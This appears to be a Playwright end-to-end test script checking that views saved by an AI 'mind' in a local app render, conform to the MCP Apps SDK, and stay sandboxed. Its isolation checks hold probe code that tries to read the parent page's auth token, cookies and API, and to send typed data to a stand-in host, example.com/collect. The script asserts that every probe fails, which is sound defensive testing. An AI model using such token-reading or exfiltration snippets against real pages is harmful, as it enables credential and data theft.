/**
 * Artifact views end to end on a running local hive, in a real browser, Chromium, Firefox or WebKit (--engine, Chromium
 * when absent): a mind saves a view written in MeTTa (the way
 * minds are taught to write one), two HTML views (one written by hand, one built on the official MCP Apps SDK) and a
 * plan, and names the views, the plan and an id that names nothing in its chat; the check opens them on Artifacts, in
 * the chat, and fullscreen, and proves what the design promises:
 *   - a view written in MeTTa is drawn by the hive's own blocks, with no frame, works out its values as the person
 *     types, and takes up its mind's change as the mind saves it, keeping what was typed, with no reload; its MeTTa runs
 *     in a worker the hive serves with no network and no code generation;
 *   - isolation: the view's origin is opaque; it cannot read the hive page, its storage (where the token lives) or its
 *     cookies; it cannot fetch the hive's API or an undeclared domain; its in-memory storage works; a view that sends
 *     its own frame to another site sends nothing (the page's frame-src 'self' blocks it, and the page hears so), and a
 *     frame that loads a second page is closed, with Show it again;
 *   - conformance: the SDK view completes ui/initialize, gets the host context (capabilities, display modes, theme and
 *     style variables), has its tool call refused, resizes its frame, switches to fullscreen on request, opens a link
 *     and saves a file only through the alertdialog the hive draws under it, and its message lands in the mind's
 *     message box, not sent;
 *   - the frame keeps its state across fullscreen and back;
 *   - the view a mind names sits under that message in its chat, and no artifact id reaches the person: each reads as
 *     its title in a chip that opens it (the view brought into sight, anything else on Artifacts), and one that is
 *     gone or not shown says so;
 * and writes screenshots at 1440x900 and 390x844 into --out, with views-check.json beside them. They carry the names
 * screenshots/ keeps them under (30-view-artifacts-desktop.png and the rest), so copying them there refreshes those.
 *
 * Usage (a disposable hive with invented content; the operator password in HIVE_CHECK_PASSWORD):
 *   node scripts/views-check.mjs --hive http://127.0.0.1:8871 [--engine chromium|firefox|webkit] [--browser <executable>]
 *     --sdk <app-with-deps.js> --out <dir>
 * --browser runs that build of the engine; without it, the build playwright-core installs. --only <words> runs just the
 * checks whose names hold those words. Exits non-zero, naming every failed check, when any check fails.
 */
import assert from 'node:assert/strict'
import { mkdir, readFile, writeFile } from 'node:fs/promises'
import { dirname, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { chromium, firefox, webkit } from 'playwright-core'

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..')
const args = process.argv.slice(2)
const flag = (name) => { const i = args.indexOf(name); return i < 0 ? null : args[i + 1] }
const hive = (flag('--hive') ?? '').replace(/\/+$/, '')
const engine = flag('--engine') ?? 'chromium'
const browserType = { chromium, firefox, webkit }[engine]
const browserPath = flag('--browser')
const sdkPath = flag('--sdk')
const out = resolve(flag('--out') ?? 'views-check-out')
const password = process.env.HIVE_CHECK_PASSWORD
// --only <words>: run just the checks whose names hold those words (the setup still runs), for a shorter loop while fixing one
const only = flag('--only')
assert(hive && sdkPath && password && browserType, 'needs --hive, --sdk, HIVE_CHECK_PASSWORD, and --engine chromium, firefox or webkit')
const SDK_URL = 'https://cdn.jsdelivr.net/npm/@modelcontextprotocol/ext-apps@2.0.4/dist/src/app-with-deps.js'
const LINK_URL = 'https://modelcontextprotocol.io/extensions/apps'

const results = []
let shown = null   // the page a failed check photographs
const check = async (name, fn) => {
  if (only && !name.includes(only)) return
  try { await fn(); results.push({ name, ok: true }); console.log(`ok    ${name}`) }
  catch (e) {
    results.push({ name, ok: false, error: String(e?.message ?? e) })
    console.log(`FAIL  ${name}: ${e?.message ?? e}`)
    await shown?.screenshot({ path: resolve(out, `failed-${name.replace(/[^a-z0-9]+/gi, '-').toLowerCase()}.png`), animations: 'disabled' }).catch(() => undefined)
  }
}

async function api(method, path, token, body) {
  const res = await fetch(hive + path, { method, headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}) }, body: body === undefined ? undefined : JSON.stringify(body) })
  const text = await res.text()
  if (!res.ok) throw new Error(`${method} ${path} -> ${res.status} ${text.slice(0, 300)}`)
  return text ? JSON.parse(text) : null
}

await mkdir(out, { recursive: true })
// a named person, as a tester signs in: the operator password's session is not a person, and person routes refuse it
const operatorToken = (await api('POST', '/api/auth/login', null, { password })).token
const email = `views-check-${Date.now()}@example.test`
const member = await api('POST', '/api/people/members', operatorToken, { email, name: 'Sam' })
const person = (await api('POST', '/api/auth/login', null, { email, password: member.password })).token
const swarm = await api('POST', '/api/swarms', person, { name: 'Weekend plans' })
const wren = await api('POST', '/api/agents', person, { name: 'Wren', kind: 'module', swarm_id: swarm.id })
const tipHtml = await readFile(resolve(root, 'scripts/fixtures/views-tip.html'), 'utf8')
const sdkHtml = await readFile(resolve(root, 'scripts/fixtures/views-sdk.html'), 'utf8')
// the MeTTa tip calculator the server tests and the UI tests share, and the change its mind makes to it
const tipMetta = await readFile(resolve(root, '../tests/fixtures/views-tip.metta'), 'utf8')
const tipMettaChanged = tipMetta.replace('(option "10" "10%") (option "15" "15%") (option "20" "20%")', '(option "18" "18%") (option "20" "20%") (option "25" "25%")')
  .replace('(Start pct "15")', '(Start pct "18")')
assert.notEqual(tipMettaChanged, tipMetta)
const mtip = await api('POST', '/api/agent/artifacts', wren.token, { kind: 'view', title: 'Tip and split', body: tipMetta })
const tip = await api('POST', '/api/agent/artifacts', wren.token, { kind: 'view', title: 'Tip calculator', body: tipHtml })
const sdk = await api('POST', '/api/agent/artifacts', wren.token, { kind: 'view', title: 'Host check',
  // as JSON text, as the mind's hive-artifact-create sends an object body
  body: JSON.stringify({ mimeType: 'text/html;profile=mcp-app', text: sdkHtml, _meta: { ui: { csp: { resourceDomains: ['https://cdn.jsdelivr.net'] }, prefersBorder: true } } }) })
const list = await api('POST', '/api/agent/artifacts', wren.token, { kind: 'plan', title: 'Shopping list', body: 'Limes\nMint\nSoda water' })
// an id that names nothing: one deleted, or in a swarm this person doesn't see, reads the same
const gone = `ar_${'0'.repeat(32)}`
// the person asks in their own conversation, and the mind answers there, as a mind replies to whoever addressed it
const asked = await api('POST', `/api/agents/${wren.id}/messages`, person, { text: 'Could you make me something to split the bill tonight?' })
await api('POST', '/api/agent/messages', wren.token, { conversation_id: asked.conversation_id, text: `Here is ${tip.id} for tonight. Type the bill, pick the tip, and set how many of you there are.` })
await api('POST', '/api/agent/messages', wren.token, { conversation_id: asked.conversation_id, text: `I kept the shopping list as \`${list.id}\`, and the first draft (${gone}) is gone.` })
await api('POST', '/api/agent/messages', wren.token, { conversation_id: asked.conversation_id, text: `And ${mtip.id} does the same in your hive's own look. Type the bill and each share shows.` })
const ANY_ID = /ar_[0-9a-f]{32}/
// what the hive serves the view worker's script with (hive/core/views.py VIEW_WORKER_CSP)
const VIEW_WORKER_CSP = "default-src 'none'; script-src 'self'; connect-src 'none'"

const sdkBody = await readFile(resolve(sdkPath))
// Chromium draws with SwiftShader on a host without a GPU; the other engines need no flags
const browser = await browserType.launch({ headless: true, ...(browserPath ? { executablePath: resolve(browserPath) } : {}),
  ...(engine === 'chromium' ? { args: ['--use-angle=swiftshader', '--enable-unsafe-swiftshader'] } : {}) })
const version = browser.version()
console.log(`engine ${engine} ${version}`)
const leaks = []
async function open(viewport, mobile) {
  // no serviceWorkers option: blocking them makes Playwright probe navigator.serviceWorker in every frame, which throws
  // in a view's sandboxed frame
  const context = await browser.newContext({ viewport, deviceScaleFactor: mobile ? 2 : 1, isMobile: mobile, hasTouch: mobile })
  await context.route('**/*', (route) => {
    const url = route.request().url()
    if (url.startsWith(hive)) return route.continue()
    if (url === SDK_URL) return route.fulfill({ status: 200, contentType: 'text/javascript', headers: { 'access-control-allow-origin': '*' }, body: sdkBody })
    // the page a view's link opens, in a tab of its own (a 204 here would stop the tab from opening at all)
    if (url === LINK_URL) return route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>MCP Apps</title>' })
    leaks.push(url)
    return route.fulfill({ status: 204, body: '' })
  })
  const page = await context.newPage()
  page.setDefaultTimeout(WAIT)
  page.on('pageerror', (e) => console.log(`page error: ${e.message}`))
  await page.goto(hive + '/')
  // the person signs in and picks Never in the rest setting: the hive rests after two minutes with no input, and on a
  // loaded host one step can take that long, leaving the next click under the rest screen (features/power/rest.ts)
  await page.evaluate((t) => {
    localStorage.setItem('omegadots.hive.token', t)
    localStorage.setItem('omegahive.rest', JSON.stringify({ minutes: 0 }))
  }, person)
  return { context, page }
}
const viewFrame = (page, id) => page.frames().find((f) => f.url().includes(`/api/views/${id}.`))
// waits are generous: the check runs on shared, loaded hosts where the first page also compiles its screens
const WAIT = 90_000
async function waitFrame(page, id) {
  for (let i = 0; i < WAIT / 100; i++) {
    const f = viewFrame(page, id)
    if (f) { await f.waitForLoadState('load'); return f }
    await page.waitForTimeout(100)
  }
  throw new Error(`no frame for ${id}`)
}
/** Until the frame stops moving: its size report resizes it, and a click aimed before that lands where it used to be. */
async function settled(page, id) {
  // into sight first: Chrome pauses animation frames in a cross-origin frame scrolled out of view, so a view below the
  // fold sends its size only once it is seen (a chat's latest message can sit just under the visible part)
  await page.locator(`dialog[data-view="${id}"]`).first().evaluate((el) => el.scrollIntoView({ block: 'center' }))
  await page.locator(`dialog[data-view="${id}"][data-view-sized]`).first().waitFor()   // its first size report is in
  const box = page.locator(`dialog[data-view="${id}"] iframe`).first()
  let last = ''
  for (let i = 0; i < 40; i++) {
    const b = await box.boundingBox()
    const now = b ? `${Math.round(b.x)},${Math.round(b.y)},${Math.round(b.width)},${Math.round(b.height)}` : ''
    if (now && now === last) return
    last = now
    await page.waitForTimeout(300)
  }
}
/** The hive shows a resting clock after a while without input: a small mouse move clears it. */
async function wake(page) {
  await page.mouse.move(3, 3)
  await page.mouse.move(6, 6)
  await page.waitForTimeout(700)
}
async function photograph(page, name) {
  await wake(page)
  await page.screenshot({ path: resolve(out, name), animations: 'disabled', timeout: WAIT })
}
/** A real click into a view's frame (the acting requests need the person's own activation), pressed again when its
 *  effect has not shown: on a loaded host a pointer click routed into the sandboxed frame's own process is sometimes
 *  lost. Every repeat is counted in the receipt, so a host that loses clicks shows it. */
const repeats = []
async function pressUntil(target, effect, what) {
  for (let attempt = 1; ; attempt++) {
    await target.click()
    try { await (typeof effect === 'function' ? effect(8_000) : effect.waitFor({ timeout: 8_000 })); return } catch (e) {
      if (attempt >= 4) throw e
      repeats.push(what)
      console.log(`note  ${what}: no effect after click ${attempt}, pressing again`)
    }
  }
}
/** A fresh load of a place in the hive, so no state from the step before carries over. */
const visit = (page, hash) => page.goto(`${hive}/?visit=${Date.now()}#${hash}`)
async function openOnArtifacts(page, title) {
  await visit(page, '/artifacts')
  const row = page.locator('li, [role="listitem"], article').filter({ hasText: title }).first()
  const open = row.getByRole('button', { name: 'Open it' })
  await open.waitFor({ state: 'visible', timeout: WAIT })
  await open.click({ timeout: WAIT })
  await runIfAsked(page)
}
/** No view runs until its person asks: a card stands in its place until Run it, which the check presses when it shows. */
async function runIfAsked(page) {
  const card = page.locator('[data-view-run]').first()
  const frame = page.locator('dialog[data-view]').first()
  await card.or(frame).waitFor({ timeout: WAIT })
  if (await card.isVisible()) {
    await card.getByRole('button', { name: 'Run it' }).click()
    await frame.waitFor({ timeout: WAIT })
  }
}
/** A MeTTa view drawn and settled: its worker reported a bare scope and its first frame is in. */
async function mettaDrawn(page, id) {
  const box = page.locator(`dialog[data-view="${id}"][data-view-carrier="metta"]`).first()
  await box.locator('xpath=self::*[@data-view-state="drawn"]').waitFor({ timeout: WAIT })
  return box
}
/** The tip the MeTTa view shows for a bill of 84.50: 15% before its mind's change, 18% after it. */
const tipFor = async (box) => ((await box.getAttribute('data-view-revision')) === '1' ? '12.68' : '15.21')

for (const [label, viewport, mobile] of [['1440x900', { width: 1440, height: 900 }, false], ['390x844', { width: 390, height: 844 }, true]]) {
  const size = mobile ? 'mobile' : 'desktop'
  const { context, page } = await open(viewport, mobile)
  shown = page
  await check(`${label}: a view written in MeTTa is drawn by the hive's own blocks`, async () => {
    if (!mobile) {
      // the first time: a card that names it and its maker, and nothing of it running, until Run it
      await visit(page, '/artifacts')
      await page.locator('li, [role="listitem"], article').filter({ hasText: 'Tip and split' }).first().getByRole('button', { name: 'Open it' }).click({ timeout: WAIT })
      const card = page.locator(`[data-view-run="${mtip.id}"]`)
      await card.getByText('Tip and split, a view made by Wren. It runs only when you ask it to.').waitFor({ timeout: WAIT })
      assert.equal(await page.locator(`dialog[data-view="${mtip.id}"]`).count(), 0, 'nothing of it runs before Run it')
      await photograph(page, '35-view-run-card-desktop.png')
    }
    await openOnArtifacts(page, 'Tip and split')
    const box = await mettaDrawn(page, mtip.id)
    assert.equal(await box.locator('iframe').count(), 0, 'no frame: the hive drew it')
    await box.getByText('Type the bill to see the split.').waitFor()
    await box.locator('input').first().fill('84.50')
    await box.getByText(await tipFor(box), { exact: true }).waitFor()
    assert.equal(await box.getByText('Type the bill to see the split.').count(), 0, 'the note gives way to the sums')
    await box.getByText('View made by Wren. It runs on its own and cannot see your hive.').waitFor()
    if (mobile) await box.evaluate((el) => el.scrollIntoView({ block: 'start' }))
    await photograph(page, `33-view-metta-artifacts-${size}.png`)
  })
  if (label === '1440x900') {
    await check('a view written in MeTTa takes its mind\'s change live and keeps what was typed', async () => {
      const box = await mettaDrawn(page, mtip.id)
      assert.equal(await box.getAttribute('data-view-revision'), '1')
      await page.evaluate(() => { window.__notReloaded = true })
      // the mind saves the change, as its hive-revision does
      await api('POST', `/api/agent/artifacts/${mtip.id}/revisions`, wren.token, { body: tipMettaChanged, parent: 1 })
      await page.locator(`dialog[data-view="${mtip.id}"][data-view-revision="2"][data-view-state="drawn"]`).waitFor({ timeout: WAIT })
      await box.getByText('25%', { exact: true }).waitFor()
      await box.getByText('15.21', { exact: true }).waitFor()
      assert.equal(await box.locator('input').first().inputValue(), '84.50', 'what the person typed stayed')
      assert.equal(await page.evaluate(() => window.__notReloaded === true), true, 'the page was not reloaded')
      // the reader around it names the revision it now shows
      await page.getByText(/^Revision 2, saved /).waitFor()
      await photograph(page, `33b-view-metta-changed-${size}.png`)
    })
    await check('a view written in MeTTa runs where it cannot reach out', async () => {
      const worker = await page.evaluate(() => performance.getEntriesByType('resource').map((e) => e.name).find((n) => /\/assets\/viewSandbox\.worker-[A-Za-z0-9_-]+\.js$/.test(n)))
      assert(worker, 'the view worker script was loaded from the hive')
      const res = await fetch(worker)
      assert.equal(res.headers.get('content-security-policy'), VIEW_WORKER_CSP)
      // the frame draws only after its worker reported a bare scope (data-view-state unsafe otherwise)
      assert.equal(await page.locator(`dialog[data-view="${mtip.id}"]`).first().getAttribute('data-view-state'), 'drawn')
    })
  }
  await check(`${label}: a view opens in place on Artifacts`, async () => {
    await openOnArtifacts(page, 'Tip calculator')
    const frame = await waitFrame(page, tip.id)
    await settled(page, tip.id)
    await frame.locator('#bill').fill('120')
    await settled(page, tip.id)
    // the view's own buttons are pressed by event: this tests the view's logic and the frame around it, and on a host
    // at load 20 a pointer click routed into the sandboxed frame's own process can land before its resize does
    await frame.locator('button[data-tip="20"]').dispatchEvent('click')
    await frame.locator('button[data-tip="20"][aria-pressed="true"]').waitFor({ timeout: 10_000 })
    await frame.locator('#more').dispatchEvent('click')
    await frame.locator('#people:text("4")').waitFor({ timeout: 10_000 })
    assert.equal(await frame.locator('#each').textContent(), '$36.00')
    assert.equal(await frame.locator('#remembered').textContent(), 'remembers 20%', 'the in-memory storage kept the choice')
    await page.waitForTimeout(400)   // the size report lands
    const height = await page.locator('dialog[data-view] iframe').evaluate((f) => f.getBoundingClientRect().height)
    assert(height > 300, `the frame took its content's height (${height}px)`)
    // on a phone the floating Ask bar covers the end of the page: the picture starts at the view, so all of it shows
    if (mobile) await page.locator('dialog[data-view]').evaluate((el) => el.scrollIntoView({ block: 'start' }))
    await photograph(page, `30-view-artifacts-${size}.png`)
  })
  if (label === '1440x900') {
    await check('isolation: an opaque origin with no way into the hive', async () => {
      const frame = viewFrame(page, tip.id)
      const seen = await frame.evaluate(async () => {
        const tryIt = async (fn) => { try { return { ok: true, value: await fn() } } catch (e) { return { ok: false, error: e?.name ?? String(e) } } }
        localStorage.setItem('probe', 'kept')
        return {
          origin: window.origin,
          parentStorage: await tryIt(() => window.parent.localStorage.getItem('omegadots.hive.token')),
          parentDocument: await tryIt(() => window.parent.document.title),
          cookie: await tryIt(() => document.cookie),
          hiveApi: await tryIt(() => fetch('/api/agents').then((r) => r.status)),
          hiveApiAbsolute: await tryIt(() => fetch(new URL('/api/agents', location.href).href).then((r) => r.status)),
          elsewhere: await tryIt(() => fetch('https://example.com/collect').then((r) => r.status)),
          storage: localStorage.getItem('probe'),
        }
      })
      assert.equal(seen.origin, 'null')
      assert.equal(seen.parentStorage.ok, false, 'the hive page storage is out of reach')
      assert.equal(seen.parentDocument.ok, false, 'the hive page DOM is out of reach')
      assert.equal(seen.cookie.ok, false, 'cookies are out of reach')
      assert.equal(seen.hiveApi.ok, false, 'the hive API is out of reach')
      assert.equal(seen.hiveApiAbsolute.ok, false, 'the hive API is out of reach by its full address')
      assert.equal(seen.elsewhere.ok, false, 'an undeclared domain is out of reach')
      assert.equal(seen.storage, 'kept', 'the in-memory storage works')
      assert.deepEqual(leaks.filter((u) => u.includes('example.com')), [], 'nothing left for an undeclared domain')
      const csp = (await (await fetch(frame.url())).headers.get('content-security-policy')) ?? ''
      assert(csp.startsWith('sandbox allow-scripts allow-forms;'), csp)
    })
    await check('fullscreen keeps the view as it was', async () => {
      await page.locator('dialog[data-view]').getByRole('button', { name: 'Full screen' }).click()
      await page.locator('dialog[data-view-mode="fullscreen"]').waitFor()
      const frame = viewFrame(page, tip.id)
      assert.equal(await frame.locator('#bill').inputValue(), '120')
      assert.equal(await frame.locator('#each').textContent(), '$36.00')
      await photograph(page, `30b-view-fullscreen-${size}.png`)
      await page.keyboard.press('Escape')
      await page.locator('dialog[data-view-mode="inline"]').waitFor()
      assert.equal(await viewFrame(page, tip.id).locator('#people').textContent(), '4')
    })
    await check('conformance: the official SDK view talks to the hive', async () => {
      await openOnArtifacts(page, 'Host check')
      // it declares cdn.jsdelivr.net for the SDK: until the person allows that for this version it reaches nothing
      const reach = page.locator(`dialog[data-view="${sdk.id}"]`).getByText(/^This view asks to reach https:\/\/cdn\.jsdelivr\.net\./)
      await reach.waitFor({ timeout: WAIT })
      const closed = (await (await fetch((await waitFrame(page, sdk.id)).url())).headers.get('content-security-policy')) ?? ''
      assert(closed.includes("connect-src 'none'") && !closed.includes('jsdelivr'), closed)
      await reach.scrollIntoViewIfNeeded()
      await photograph(page, '35b-view-reach-desktop.png')
      await page.locator(`dialog[data-view="${sdk.id}"]`).getByRole('button', { name: 'Allow for this version' }).click()
      await reach.waitFor({ state: 'detached', timeout: WAIT })
      await page.waitForFunction((id) => [...document.querySelectorAll('iframe')].some((f) => f.src.includes(`/api/views/${id}.`) && /\.1\.[A-Za-z0-9_-]+$/.test(f.src)), sdk.id, { timeout: WAIT })
      const frame = await waitFrame(page, sdk.id)
      await frame.locator('#status:text("connected")').waitFor({ timeout: WAIT })
      await settled(page, sdk.id)
      const text = async (id) => (await frame.locator(`#${id}`).textContent())?.trim()
      assert.equal(await text('host'), 'OmegaHive')
      assert.equal(await text('capabilities'), 'downloadFile,logging,message,openLinks')
      assert.equal(await text('displayMode'), 'inline')
      assert.equal(await text('availableDisplayModes'), '["inline","fullscreen"]')
      assert.match(await text('theme'), /^(dark|light)$/)
      assert(Number(await text('styleVariables')) > 40, 'the look arrives as style variables')
      assert.equal(await text('toolAnswer'), 'refused')
      await photograph(page, `32-view-host-check-${size}.png`)
      await pressUntil(frame.locator('#full'), page.locator('dialog[data-view-mode="fullscreen"]'), 'full screen in the view')
      await frame.locator('#displayModeAnswer:text("fullscreen")').waitFor()
      await frame.locator('#displayMode:text("fullscreen")').waitFor()
      // focus is inside the frame now, where the host never sees keys: the host's own Close button brings it back
      await page.locator('dialog[data-view-mode="fullscreen"]').getByRole('button', { name: 'Close' }).click()
      await page.locator('dialog[data-view-mode="inline"]').waitFor()
      await frame.locator('#displayMode:text("inline")').waitFor()
      // a link: after a click in the view, the hive shows where it goes and the person opens it themselves
      // (views.metta view-host's parts, under the frame)
      const around = page.locator(`dialog[data-view="${sdk.id}"]`)
      const offer = around.getByRole('alertdialog', { name: 'Open a link from the view' })
      await pressUntil(frame.locator('#link'), offer, 'open a link in the view')
      assert.match(await offer.textContent(), /This view wants to open https:\/\/modelcontextprotocol\.io\/extensions\/apps/)
      const [tab] = await Promise.all([page.context().waitForEvent('page', { timeout: WAIT }), offer.getByRole('button', { name: 'Open', exact: true }).click()])
      await tab.waitForURL(LINK_URL)
      await frame.locator('#linkAnswer:text("opened")').waitFor()
      await tab.close()
      // a file is saved only after the person says yes under the view
      const ask = around.getByRole('alertdialog', { name: 'Save a file from the view' })
      await pressUntil(frame.locator('#save'), ask, 'save a file in the view')
      assert.match(await ask.textContent(), /Save split\.csv \(\d+ bytes\) from this view\?/)
      const [saved] = await Promise.all([page.waitForEvent('download'), ask.getByRole('button', { name: 'Save', exact: true }).click()])
      assert.equal(saved.suggestedFilename(), 'split.csv')
      await frame.locator('#saveAnswer:text("saved")').waitFor()
      await pressUntil(frame.locator('#send'), (timeout) => page.waitForURL(new RegExp(`#/dot/${wren.id}`), { timeout }), 'send to the mind in the view')
      const box = page.locator('textarea').first()
      await box.waitFor()
      assert.equal(await box.inputValue(), 'Make the tip 18% for four people.', 'the words wait in the message box, unsent')
    })
    // a frame the hive closed because it loaded a second page: MeTTa's notice in its place, and Show it again
    const closedThenShown = async (picture) => {
      const left = page.locator(`[data-view-left="${tip.id}"]`)
      await left.getByText('Tip calculator tried to open another page in its place, so it was closed.').waitFor({ timeout: WAIT })
      assert.equal(await page.locator(`dialog[data-view="${tip.id}"]`).count(), 0, 'the frame is gone')
      if (picture) await photograph(page, picture)
      await left.getByRole('button', { name: 'Show Tip calculator again' }).click()
      await (await waitFrame(page, tip.id)).locator('#bill').waitFor({ timeout: WAIT })
    }
    await check('isolation: a view that sends its own frame to another site sends nothing', async () => {
      await openOnArtifacts(page, 'Tip calculator')
      const frame = await waitFrame(page, tip.id)
      await settled(page, tip.id)
      const before = leaks.length
      // the hive page's own policy is what stops it: the page hears each frame-src violation of its CSP
      await page.evaluate(() => {
        window.__frameSrc = []
        document.addEventListener('securitypolicyviolation', (e) => { if (e.effectiveDirective === 'frame-src') window.__frameSrc.push(e.blockedURI) })
      })
      // what a view could carry off is what the person typed into it
      await frame.evaluate(() => { location.href = 'https://example.com/collect?held=120' }).catch(() => undefined)
      await page.waitForFunction(() => window.__frameSrc.some((u) => u.startsWith('https://example.com')), null, { timeout: WAIT })
      assert.deepEqual(leaks.slice(before), [], 'nothing left for another site')
      // then each engine does its own thing with the frame: Chromium shows its error page in it and WebKit fires a
      // second load, so the hive closes it; Firefox cancels the navigation, and the view stays as it was
      if (engine === 'firefox') assert.equal(await frame.locator('#bill').count(), 1, 'the view keeps its own document')
      else await closedThenShown(engine === 'chromium' ? `36-view-left-${size}.png` : null)
    })
    await check('isolation: a view whose frame loads a page of the hive\'s own origin is closed', async () => {
      // frame-src 'self' lets the frame load the hive's own origin, so every engine loads the page: a second load
      const frame = await waitFrame(page, tip.id)
      await settled(page, tip.id)
      await frame.evaluate(() => { location.href = '/api/health' }).catch(() => undefined)
      await closedThenShown(null)
    })
  }
  await check(`${label}: the view sits under the mind's message in its chat`, async () => {
    await visit(page, `/dot/${wren.id}`)
    // a view loads once its message comes near the screen, and the chat opens at its end, where the MeTTa view's
    // reply now sits below this one: bring this view's place into sight first, as a person scrolling up does
    const slot = page.locator(`[data-view-slot="${tip.id}"]`).first()
    await slot.waitFor({ state: 'attached' })
    await slot.evaluate((el) => el.scrollIntoView({ block: 'center' }))
    const frame = await waitFrame(page, tip.id)
    await settled(page, tip.id)
    await frame.locator('#each').waitFor()
    const inline = page.locator(`dialog[data-view="${tip.id}"]`).first()
    await inline.waitFor({ state: 'visible' })
    // a person never reads an artifact id: each reads as its title, or says it cannot be opened (the words MeTTa
    // composes in every look, features/views/words.metta)
    const log = page.locator('[data-mind-chat-log]')
    await log.locator('[data-artifact-ref]', { hasText: 'Tip calculator' }).first().waitFor()
    await log.locator('[data-artifact-ref]', { hasText: 'Shopping list' }).first().waitFor()
    await log.locator('[data-artifact-ref="missing"]', { hasText: 'Artifact not available' }).waitFor()
    const readable = await log.evaluate((el) => [el.innerText, ...[...el.querySelectorAll('[title],[aria-label]')].flatMap((e) => [e.getAttribute('title') ?? '', e.getAttribute('aria-label') ?? ''])].join('\n'))
    assert(!ANY_ID.test(readable), `an artifact id shows in the chat: ${readable.match(ANY_ID)?.[0]}`)
    // on a phone the mind's panel opens part way up; a person reading a long reply pulls it up, and so does the check
    if (mobile) {
      await page.getByRole('button', { name: 'Expand panel' }).click()
      await page.getByRole('button', { name: 'Collapse panel' }).waitFor()
      await page.waitForTimeout(600)   // the panel's spring settles
    }
    // the picture starts at the mind's message, so its words and the view under them are both in it. A reader scrolled
    // up who sees the log grow below gets the chat's New messages pill (lib/stickToBottom), and a size report can land
    // after the scroll on a loaded host: then the check goes to the end, as the pill does, and frames again, until a
    // picture is taken with no pill showing before or after it
    const pill = page.locator('[data-new-below]')
    for (let framing = 1; ; framing++) {
      await wake(page)
      if (await pill.isVisible()) { await pill.click(); await pill.waitFor({ state: 'hidden' }) }
      await inline.evaluate((el) => (el.closest('li') ?? el).scrollIntoView({ block: 'start' }))
      await page.waitForTimeout(1500)
      if (!(await pill.isVisible())) {
        await page.screenshot({ path: resolve(out, `31-view-chat-${size}.png`), animations: 'disabled', timeout: WAIT })
        if (!(await pill.isVisible())) break
      }
      assert(framing < 4, 'the chat log kept growing under the view')
      console.log(`note  ${label}: the chat grew after framing ${framing}, framing again`)
    }
    if (mobile) return
    // the view's chip brings the view under the message into sight; another artifact's chip opens it on Artifacts
    await log.evaluate((el) => { el.scrollTop = el.scrollHeight })
    await log.locator('[data-artifact-ref]', { hasText: 'Tip calculator' }).first().click()
    await page.waitForFunction((id) => {
      const slot = document.querySelector(`[data-view-slot="${id}"]`)?.getBoundingClientRect()
      const box = document.querySelector('[data-mind-chat-log]')?.getBoundingClientRect()
      return !!slot && !!box && slot.top >= box.top - 2 && slot.top < box.bottom - 40
    }, tip.id)
    await log.locator('[data-artifact-ref]', { hasText: 'Shopping list' }).first().click()
    await page.waitForURL(new RegExp(`#/artifacts/${list.id}$`))
    // the reader's region is named by its title, the header MeTTa composes, with the revision line under it
    const reader = page.getByRole('region', { name: 'Shopping list' })
    await reader.getByText('Soda water').waitFor()
    await reader.getByText(/^Revision 1, saved /).waitFor()
    // a link to one that is gone, or not shown to this person, says so on Artifacts, with no id in the words
    await visit(page, `/artifacts/${gone}`)
    await page.getByText('That artifact is no longer here, or not shown to you.').waitFor()
  })
  await check(`${label}: a view written in MeTTa sits under the mind's message in its chat`, async () => {
    await visit(page, `/dot/${wren.id}`)
    const box = await mettaDrawn(page, mtip.id)
    await box.evaluate((el) => (el.closest('li') ?? el).scrollIntoView({ block: 'start' }))
    await box.locator('input').first().fill('84.50')
    await box.getByText(await tipFor(box), { exact: true }).waitFor()
    const log = page.locator('[data-mind-chat-log]')
    await log.locator('[data-artifact-ref]', { hasText: 'Tip and split' }).first().waitFor()
    if (mobile && await page.getByRole('button', { name: 'Expand panel' }).isVisible()) {
      await page.getByRole('button', { name: 'Expand panel' }).click()
      await page.getByRole('button', { name: 'Collapse panel' }).waitFor()
      await page.waitForTimeout(600)
    }
    const pill = page.locator('[data-new-below]')
    if (await pill.isVisible()) { await pill.click(); await pill.waitFor({ state: 'hidden' }) }
    await box.evaluate((el) => (el.closest('li') ?? el).scrollIntoView({ block: 'start' }))
    await page.waitForTimeout(800)
    await photograph(page, `34-view-metta-chat-${size}.png`)
  })
  await context.close()
}
await browser.close()
await writeFile(resolve(out, 'views-check.json'), JSON.stringify({ hive, engine, version, browser: browserPath, metta: mtip.id, tip: tip.id, sdk: sdk.id, results, repeated_clicks: repeats }, null, 1))
const failed = results.filter((r) => !r.ok)
console.log(`views-check: ${results.length - failed.length} passed, ${failed.length} failed, ${repeats.length} click(s) pressed again`)
process.exitCode = failed.length ? 1 : 0
